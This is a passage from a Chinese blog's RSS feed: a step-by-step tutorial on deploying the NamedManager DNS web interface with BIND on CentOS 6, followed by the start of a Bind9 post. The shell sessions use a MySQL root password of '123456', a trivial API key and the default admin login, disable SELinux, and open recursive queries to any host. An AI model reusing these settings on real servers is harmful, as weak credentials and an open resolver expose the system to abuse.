<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">dns.kevin.cn</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@dns named]# cat /etc/hosts</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">127.0.0.1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   localhost</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> localhost.localdomain</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> localhost4</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> localhost4.localdomain4</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">         localhost</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> localhost.localdomain</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> localhost6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> localhost6.localdomain6</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">192.168.10.206</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dns.kevin.cn</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@dns ~]# ifconfig |</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">grep</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 192.168</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">          inet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> addr:192.168.10.206</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  Bcast:192.168.10.255</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  Mask:255.255.255.0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@dns named]# ping dns.kevin.cn</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">PING</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dns.kevin.cn</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (192.168.10.206) 56(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">84</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) bytes of data.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> from</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dns.kevin.cn</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (192.168.10.206): </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">icmp_seq</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">1</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> ttl</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">64</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> time</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">0.027</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> ms</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> from</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dns.kevin.cn</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (192.168.10.206): </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">icmp_seq</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">2</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> ttl</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">64</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> time</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">0.043</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> ms</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">......</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@dns ~]# cd /usr/local/src/</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@dns src]# wget http://repos.jethrocarr.com/pub/amberdms/linux/centos/6/amberdms-custom/i386/namedmanager-bind-1.8.0-1.el6.noarch.rpm</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@dns src]# wget http://repos.jethrocarr.com/pub/amberdms/linux/centos/6/amberdms-custom/i386/namedmanager-www-1.8.0-1.el6.noarch.rpm</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@dns src]# ll</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">total</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1352</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  109584</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Dec</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  2013</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> namedmanager-bind-1.8.0-1.el6.noarch.rpm</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1270108</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Dec</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  2013</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> namedmanager-www-1.8.0-1.el6.noarch.rpm</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>2）安装namedmanager</h2>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>[root@dns src]# yum install perl httpd mod_ssl mysql-server php php-intl php-ldap php-mysql php-soap php-xml</span></span>
<span class="line"><span>  </span></span>
<span class="line"><span>修改/etc/httpd/conf/httpd.conf</span></span>
<span class="line"><span>[root@dns src]# vim /etc/httpd/conf/httpd.conf</span></span>
<span class="line"><span>......</span></span>
<span class="line"><span>ServerName dns.kevin.cn:80</span></span>
<span class="line"><span>  </span></span>
<span class="line"><span>[root@dns src]# service mysqld start</span></span>
<span class="line"><span>[root@dns src]# service httpd start</span></span>
<span class="line"><span>[root@dns src]# lsof -i:3306</span></span>
<span class="line"><span>COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span></span>
<span class="line"><span>mysqld  16589 mysql   10u  IPv4  77732      0t0  TCP *:mysql (LISTEN)</span></span>
<span class="line"><span>[root@dns src]# lsof -i:80</span></span>
<span class="line"><span>COMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span></span>
<span class="line"><span>httpd   16621   root    4u  IPv6  77759      0t0  TCP *:http (LISTEN)</span></span>
<span class="line"><span>httpd   16623 apache    4u  IPv6  77759      0t0  TCP *:http (LISTEN)</span></span>
<span class="line"><span>httpd   16624 apache    4u  IPv6  77759      0t0  TCP *:http (LISTEN)</span></span>
<span class="line"><span>httpd   16625 apache    4u  IPv6  77759      0t0  TCP *:http (LISTEN)</span></span>
<span class="line"><span>httpd   16626 apache    4u  IPv6  77759      0t0  TCP *:http (LISTEN)</span></span>
<span class="line"><span>httpd   16627 apache    4u  IPv6  77759      0t0  TCP *:http (LISTEN)</span></span>
<span class="line"><span>httpd   16628 apache    4u  IPv6  77759      0t0  TCP *:http (LISTEN)</span></span>
<span class="line"><span>httpd   16629 apache    4u  IPv6  77759      0t0  TCP *:http (LISTEN)</span></span>
<span class="line"><span>httpd   16630 apache    4u  IPv6  77759      0t0  TCP *:http (LISTEN)</span></span>
<span class="line"><span>  </span></span>
<span class="line"><span>[root@dns src]# chkconfig mysqld on</span></span>
<span class="line"><span>[root@dns src]# chkconfig httpd on</span></span>
<span class="line"><span>  </span></span>
<span class="line"><span>[root@dns src]# mysqladmin -u root password 123456</span></span>
<span class="line"><span>  </span></span>
<span class="line"><span>[root@dns src]# rpm -Uvh namedmanager-www-1.8.0-1.el6.noarch.rpm</span></span>
<span class="line"><span>[root@dns src]# cd /usr/share/namedmanager/resources/</span></span>
<span class="line"><span>[root@dns resources]# ./autoinstall.pl</span></span>
<span class="line"><span>autoinstall.pl</span></span>
<span class="line"><span>  </span></span>
<span class="line"><span>This script setups the NamedManager database components:</span></span>
<span class="line"><span> * NamedManager MySQL user</span></span>
<span class="line"><span> * NamedManager database</span></span>
<span class="line"><span> * NamedManager configuration files</span></span>
<span class="line"><span>  </span></span>
<span class="line"><span>THIS SCRIPT ONLY NEEDS TO BE RUN FOR THE VERY FIRST INSTALL OF NAMEDMANAGER.</span></span>
<span class="line"><span>DO NOT RUN FOR ANY OTHER REASON</span></span>
<span class="line"><span>  </span></span>
<span class="line"><span>Please enter MySQL root password (if any): 123456        //输入mysql密码</span></span>
<span class="line"><span>Searching ../sql/ for latest install schema...</span></span>
<span class="line"><span>../sql//version_20131222_install.sql is the latest file and will be used for the install.</span></span>
<span class="line"><span>Importing file ../sql//version_20131222_install.sql</span></span>
<span class="line"><span>Creating user...</span></span>
<span class="line"><span>Updating configuration file...</span></span>
<span class="line"><span>DB installation complete!</span></span>
<span class="line"><span>  </span></span>
<span class="line"><span>You can now login with the default username/password of setup/setup123 at http://localhost/namedmanager</span></span>
<span class="line"><span>  </span></span>
<span class="line"><span>  </span></span>
<span class="line"><span>[root@dns resources]# cd /usr/local/src/</span></span>
<span class="line"><span>[root@dns src]# yum install bind php-process</span></span>
<span class="line"><span>[root@dns src]# rpm -Uvh namedmanager-bind-1.8.0-1.el6.noarch.rpm</span></span>
<span class="line"><span>  </span></span>
<span class="line"><span>  </span></span>
<span class="line"><span>修改/etc/named.conf</span></span>
<span class="line"><span>[root@dns src]# cp /etc/named.conf /etc/named.conf.bak</span></span>
<span class="line"><span>[root@dns src]# vim /etc/named.conf</span></span>
<span class="line"><span>options {</span></span>
<span class="line"><span>        listen-on port 53 { any; };</span></span>
<span class="line"><span>//      listen-on-v6 port 53 { ::1; };</span></span>
<span class="line"><span>        directory "/var/named";</span></span>
<span class="line"><span>        dump-file       "/var/named/data/cache_dump.db";</span></span>
<span class="line"><span>        statistics-file "/var/named/data/named_stats.txt";</span></span>
<span class="line"><span>        memstatistics-file "/var/named/data/named_mem_stats.txt";</span></span>
<span class="line"><span>        allow-query     { any; };</span></span>
<span class="line"><span>        allow-query-cache     { any; };         //DNS查询的缓存功能。实际上不建议开启此功能，即删除这一行配置。如果打开了，当DNS解析修改后，因为缓存原因，需等待一段时间才能生效。</span></span>
<span class="line"><span>        recursion yes;</span></span>
<span class="line"><span>        forward first;</span></span>
<span class="line"><span>        forwarders {</span></span>
<span class="line"><span>            223.5.5.5;</span></span>
<span class="line"><span>            223.6.6.6;</span></span>
<span class="line"><span>            8.8.8.8;</span></span>
<span class="line"><span>            8.8.4.4;</span></span>
<span class="line"><span>          };</span></span>
<span class="line"><span> </span></span>
<span class="line"><span>        dnssec-enable yes;</span></span>
<span class="line"><span>        dnssec-validation yes;</span></span>
<span class="line"><span>        dnssec-lookaside auto;</span></span>
<span class="line"><span> </span></span>
<span class="line"><span>        bindkeys-file "/etc/named.iscdlv.key";</span></span>
<span class="line"><span>        managed-keys-directory "/var/named/dynamic";</span></span>
<span class="line"><span> </span></span>
<span class="line"><span>        };</span></span>
<span class="line"><span>  </span></span>
<span class="line"><span>logging {                           </span></span>
<span class="line"><span>        channel default_debug {</span></span>
<span class="line"><span>        file "data/named.run";</span></span>
<span class="line"><span>        severity dynamic;</span></span>
<span class="line"><span>        };</span></span>
<span class="line"><span>};</span></span>
<span class="line"><span>  </span></span>
<span class="line"><span>zone "." {</span></span>
<span class="line"><span>        type hint;      </span></span>
<span class="line"><span>        file "named.ca";</span></span>
<span class="line"><span>        };</span></span>
<span class="line"><span>  </span></span>
<span class="line"><span>include "/etc/named.rfc1912.zones";</span></span>
<span class="line"><span>include "/etc/named.root.key";</span></span>
<span class="line"><span>include "/etc/named.namedmanager.conf";</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>==========================================================</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>如果要bind可以在chroot的模式下运行</span></span>
<span class="line"><span>[root@dns src]# yum install bind-chroot</span></span>
<span class="line"><span> </span></span>
<span class="line"><span>建立“/etc/named.namedmanager.conf”文件的硬连接</span></span>
<span class="line"><span>[root@dns src]# ln /etc/named.namedmanager.conf /var/named/chroot/etc/named.namedmanager.conf</span></span>
<span class="line"><span> </span></span>
<span class="line"><span>如果不建立硬连接named启动时，会提示找不到“/etc/named.namedmanager.conf”。</span></span>
<span class="line"><span>这是因为：</span></span>
<span class="line"><span>bind-chroot是bind的一个功能，使bind可以在一个chroot的模式下运行。也就是说,bind运行时的/(根)目录,并不是系统真正的/(根)目录，只是系统中的一个子目录而已。</span></span>
<span class="line"><span>这样做的目的是为了提高安全性。因为在chroot的模式下，bind可以访问的范围仅限于这个子目录的范围里，无法进一步提升,进入到系统的其他目录中。</span></span>
<span class="line"><span> </span></span>
<span class="line"><span>chroot可以改变程序运行时所参考的根目录(/)位置，即将某个特定的子目录作为程序的虚拟根目录，并且对程序运行时可以使用的系统资源，用户权限和所在目录进行严</span></span>
<span class="line"><span>格控制，程序只在这个虚拟的根目录下具有权限，一旦跳出该目录就无任何权限。例如在centos中，/var/name/chroot实际上是根目录(/)的虚拟目录，所以虚拟目录中的</span></span>
<span class="line"><span>/etc目录实际上是/var/named/chroot/etc目录，而/var/named目录实际上是/var/named/chroot/var/named目录。chroot功能的优点是：如果有黑客通过Bind侵入系统，也只能被限定在chroot目录及其子目录中，其破坏力也仅局限在该虚拟目录中，不会威胁到整个服务器</span></span>
<span class="line"><span>的安全。</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>==========================================================</p>
<h2>3）启动named服务</h2>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>[root@dns src]# service named start</span></span>
<span class="line"><span>[root@dns src]# chkconfig named on</span></span>
<span class="line"><span>[root@dns src]# lsof -i:53</span></span>
<span class="line"><span>COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span></span>
<span class="line"><span>named   16864 named   20u  IPv4  81946      0t0  TCP localhost:domain (LISTEN)</span></span>
<span class="line"><span>named   16864 named   21u  IPv4  81948      0t0  TCP 192.168.10.206:domain (LISTEN)</span></span>
<span class="line"><span>named   16864 named  512u  IPv4  81945      0t0  UDP localhost:domain</span></span>
<span class="line"><span>named   16864 named  513u  IPv4  81947      0t0  UDP 192.168.10.206:domain</span></span>
<span class="line"><span> </span></span>
<span class="line"><span>修改/etc/namedmanager/config-bind.php</span></span>
<span class="line"><span>[root@dns src]# cp /etc/namedmanager/config-bind.php /etc/namedmanager/config-bind.php.bak</span></span>
<span class="line"><span>[root@dns src]# vim /etc/namedmanager/config-bind.php</span></span>
<span class="line"><span>.......</span></span>
<span class="line"><span>$config["api_url"]      = "http://192.168.10.206/namedmanager";          // 应用程序的安装位置</span></span>
<span class="line"><span>$config["api_server_name"]  = "dns.kevin.cn";                            // 此处必须与httpd配置里的Name Server名称一致</span></span>
<span class="line"><span>$config["api_auth_key"]     = "Dns";</span></span>
<span class="line"><span>......</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>4）设置防火墙</h2>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>namedmanager部署机本机要么关闭iptables，要么安装如下设置：</span></span>
<span class="line"><span>[root@dns src]# setenforce 0</span></span>
<span class="line"><span>[root@dns src]# getenforce</span></span>
<span class="line"><span>[root@dns src]# vim /etc/sysconfig/selinux</span></span>
<span class="line"><span>.......</span></span>
<span class="line"><span>SELINUX=disabled</span></span>
<span class="line"><span> </span></span>
<span class="line"><span>[root@dns src]# iptables -F</span></span>
<span class="line"><span>[root@dns src]# iptables -P INPUT DROP</span></span>
<span class="line"><span>[root@dns src]# iptables -P FORWARD DROP</span></span>
<span class="line"><span>[root@dns src]# iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</span></span>
<span class="line"><span>[root@dns src]# iptables -A INPUT -i lo -p all -j ACCEPT</span></span>
<span class="line"><span>[root@dns src]# iptables -A INPUT -p icmp -j ACCEPT</span></span>
<span class="line"><span>[root@dns src]# iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span></span>
<span class="line"><span>[root@dns src]# iptables -A INPUT -p tcp --dport 53 -j ACCEPT</span></span>
<span class="line"><span>[root@dns src]# iptables -A INPUT -p udp --dport 53 -j ACCEPT</span></span>
<span class="line"><span>[root@dns src]# iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span></span>
<span class="line"><span>[root@dns src]# iptables -A INPUT -p tcp --dport 443 -j ACCEPT</span></span>
<span class="line"><span> </span></span>
<span class="line"><span>禁用IPV6。添加域名记录（正向解析与反向解析）。设置开机启动服务，并重启服务器。</span></span>
<span class="line"><span>[root@dns src]# vim /etc/modprobe.d/dist.conf         //文件结尾添加如下内容：</span></span>
<span class="line"><span>......</span></span>
<span class="line"><span>alias net-pf-10 off</span></span>
<span class="line"><span>alias ipv6 off</span></span>
<span class="line"><span>chkconfig ip6tables off</span></span>
<span class="line"><span> </span></span>
<span class="line"><span>[root@dns src]# chkconfig httpd on</span></span>
<span class="line"><span>[root@dns src]# chkconfig mysqld on</span></span>
<span class="line"><span>[root@dns src]# chkconfig named on</span></span>
<span class="line"><span> </span></span>
<span class="line"><span>[root@dns src]# init 6      //或者执行"reboot"</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>5）访问namedmanager</h2>
<p>访问 http://192.168.10.206/namedmanager ，<strong>默认用户名和密码（setup，setup123）</strong>。不要忘记在用户管理中修改用户名和密码。</p>
<p></p>
<p><strong>接着设置API key（如下图。设置邮箱地址和API key，这个key是在上面的/etc/namedmanager/config-bind.php文件中设置的）</strong></p>
<p></p>
<p>添加服务器。Name Server FQDN的名称要和httpd中的ServerName一致。（如下添加部署机的主机名或者ip地址都可以）</p>
<p></p>
<p></p>
<p><strong>添加正向域名解析</strong></p>
<p></p>
<p><strong>添加反向域名解析（如果有多个ip段的客户机，那么就如下图添加多个反向解析配置）</strong></p>
<p></p>
<p><strong>查看正反向解析域名添加情况</strong></p>
<p><strong></strong></p>
<p><strong>上面已经成功添加了正反向解析域名，现在尝试添加一些域名的A记录和PTR记录</strong></p>
<p><strong>先添加A正向解析记录</strong></p>
<p><strong></strong></p>
<p><strong></strong></p>
<p><strong>由于上面在添加A正向解析的时候，已经勾选了PTR反向解析（如果没有勾选，则需要手动添加PTR反向解析记录），故这时候已经有了上面那几个域名的反向解析记录了：</strong></p>
<p><strong></strong></p>
<p><strong></strong></p>
<p><strong>如上，已经添加了几个正反向解析记录，现在到namedmanager部署机器本机上查看相关的正反向解析配置：</strong></p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@dns ~]# cd /var/named/</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@dns named]# ll</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">total</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 40</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">   490</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Apr</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  7</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 14:48</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 10.168.192.in-addr.arpa.zone</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">drwxr-x</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Bind9安装和使用</title>
      <link>https://www.geekery.cn/note-book/DNS/Bind9%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8.html</link>
      <guid>https://www.geekery.cn/note-book/DNS/Bind9%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Bind9安装和使用</source>
      <description>Bind9安装和使用 CentOS下， yum install bind安装bind软件来实现DNS服务, yum info bind可以查看到描述： BIND是DNS协议的一种实现。BIND包含了一个DNS Server（服务名叫named）,用来解析主机名到ip地址；一个解析库；一些辅助工具，还有一个安全目录工具，分别属于下面几个包： named ...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p>CentOS下， yum install bind安装bind软件来实现DNS服务, yum info bind可以查看到描述：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Description</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> :</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> BIND</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (Berkeley </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">Internet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Domain</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) is an implementation of the DNS</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">            :</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (Domain </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">Name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> System</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) protocols. BIND includes a DNS server (</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">named</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">),</span></span>
